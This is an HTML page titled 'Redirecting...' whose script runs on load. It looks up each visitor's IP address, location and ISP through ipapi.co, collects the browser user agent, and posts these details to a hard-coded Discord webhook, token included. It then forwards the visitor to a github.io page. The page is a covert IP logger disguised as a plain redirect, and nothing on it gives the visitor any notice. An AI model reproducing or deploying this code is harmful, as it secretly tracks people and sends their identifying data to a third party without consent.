<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        (async () => { 
            const minDelay = 2000; 
            const startTime = Date.now();

            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const data = await ipResponse.json();

                const webhookURL = 'https://discord.com/api/webhooks/1400273980522365038/A5LHQj8BQv5mzerr8QpDJ2_iPWInsSLu4meFRf4aA51T4u77LS8awsezamSlfG65H2nw';
                const embed = {
                    title: "📌 New Visitor Logged",
                    color: 0xFF0000,
                    fields: [
                        { name: "🌐 IP Address", value: `\`${data.ip || "Unknown"}\`` },
                        { name: "📍 Location", value: `${data.city || "?"}, ${data.region || "?"}, ${data.country_name || "?"}` },
                        { name: "🛜 ISP", value: data.org || "Unknown" },
                        { name: "🔍 User Agent", value: `\`\`\`${navigator.userAgent || "Unknown"}\`\`\`` },
                        { name: "🕒 Time", value: new Date().toLocaleString() }
                    ]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                console.log("Data sent successfully!");

            } catch (error) {
                console.error("Error logging data:", error);
            }

            const elapsed = Date.now() - startTime;
            const remainingDelay = Math.max(0, minDelay - elapsed);
            
            setTimeout(() => {
                window.location.href = "https://milo-is-cooked.github.io/ddom/main.html";
            }, remainingDelay);

        })();
    </script>
</head>
<body>
</body>
</html>
